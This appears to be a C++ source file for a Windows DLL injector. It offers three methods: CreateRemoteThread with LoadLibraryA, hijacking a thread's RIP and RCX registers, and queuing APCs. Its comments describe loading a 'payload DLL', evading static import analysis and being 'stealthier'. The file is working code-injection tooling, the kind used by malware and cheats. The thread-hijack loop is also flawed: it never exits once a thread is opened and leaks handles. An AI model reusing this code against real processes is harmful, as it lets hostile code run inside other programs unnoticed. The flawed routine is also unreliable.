#include "Injector.h"
#include <iostream>
#include <tlhelp32.h>

/*
 * Injects a DLL into a target process using the standard CreateRemoteThread method.
 * This method allocates memory in the target process, writes the DLL path into it,
 * and forces the target process to execute LoadLibraryA via a newly created remote thread.
 * input: hProcess Handle to the target process (requires PROCESS_ALL_ACCESS).
 *			dllPath Absolute path to the payload DLL.
 * output: true if injection was successful, false otherwise.
 */
bool Injector::InjectStandard(HANDLE hProcess, const std::string& dllPath)
{
	HANDLE hThread = NULL;
	LPVOID pRemoteBuf, pLoadLibrary = NULL;

	if (!hProcess)
		return false;

	// Allocate memory in the remote process for the DLL path
	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pRemoteBuf)
		return false;

	// Write the DLL path string into the allocated memory
	if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), dllPath.length() + 1, NULL))
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	// Resolve the address of LoadLibraryA dynamically to evade static IAT analysis
	pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibrary)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	// Create a remote thread that begins execution at LoadLibraryA
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuf, 0, NULL);
	if (!hThread)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	CloseHandle(hThread);
	return true;
}


/*
 * Injects a DLL by hijacking the execution context of an existing thread (x64).
 * Suspends a running thread, modifies its instruction pointer (RIP) and argument register (RCX)
 * to execute LoadLibraryA with the payload path, and then resumes the thread.
 * Note: Designed for x64 architecture.
 * input:  processID The target process identifier.
 *		   hProcess Handle to the target process.
 *		   dllPath Absolute path to the payload DLL.
 * output: true if the thread context was successfully hijacked, false otherwise.
 */
bool Injector::InjectHijack(DWORD processID, HANDLE hProcess, const std::string& dllPath)
{
	HANDLE hThread = NULL, hSnap = NULL;
	LPVOID pRemoteBuf, pLoadLibrary = NULL;
	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	if (!hProcess || !processID)
		return false;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pRemoteBuf)
		return false;

	if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), dllPath.length() + 1, NULL))
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibrary)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	// Find the first available thread of the target process
	if (Thread32First(hSnap, &te))
	{
		do
		{
			if (te.th32OwnerProcessID == processID)
				hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
		} while (Thread32Next(hSnap, &te) || hThread);
	}
	CloseHandle(hSnap);	

	if (!hThread)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	// Suspend the thread to safely manipulate its registers
	SuspendThread(hThread);

	// Retrieve the current context, modify registers, and apply the new context
	if (GetThreadContext(hThread, &ctx))
	{
		// x64 calling convention: RCX holds the first argument, RIP is the instruction pointer
		ctx.Rcx = (DWORD64)pRemoteBuf;
		ctx.Rip = (DWORD64)pLoadLibrary;
		SetThreadContext(hThread, &ctx);
	}

	// Resume the thread, executing LoadLibraryA
	ResumeThread(hThread);
	CloseHandle(hThread);

	return true;
}

/*
 * Injects a DLL using Asynchronous Procedure Calls (APC) targeting existing threads.
 * A stealthier approach that queues the LoadLibraryA execution to an existing thread's
 * APC queue. The DLL is loaded when the target thread enters an alertable state.
 * input: processID The target process identifier.
 *		  hProcess Handle to the target process.
 *		  dllPath Absolute path to the payload DLL.
 * output: true if the APC was successfully queued, false otherwise.
 */
bool Injector::InjectAPC(DWORD processID, HANDLE hProcess, const std::string& dllPath)
{
	HANDLE hThread = NULL, hSnap = NULL;
	LPVOID pRemoteBuf, pLoadLibrary = NULL;
	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	bool injected = false;

	if (!hProcess || !processID)
		return false;

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pRemoteBuf)
		return false;

	if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath.c_str(), dllPath.length() + 1, NULL))
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibrary)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	// Enumerate all threads to find those belonging to the target process
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	if (Thread32First(hSnap, &te))
	{
		do
		{
			if (te.th32OwnerProcessID == processID)
			{
				hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
				if (hThread)
				{
					// Queue the APC execution
					QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteBuf);
					CloseHandle(hThread);
					injected = true;
				}
			}
		} while (Thread32Next(hSnap, &te));	
	}
	CloseHandle(hSnap);

	if (!injected) {
		VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
		return false;
	}

	return true;
}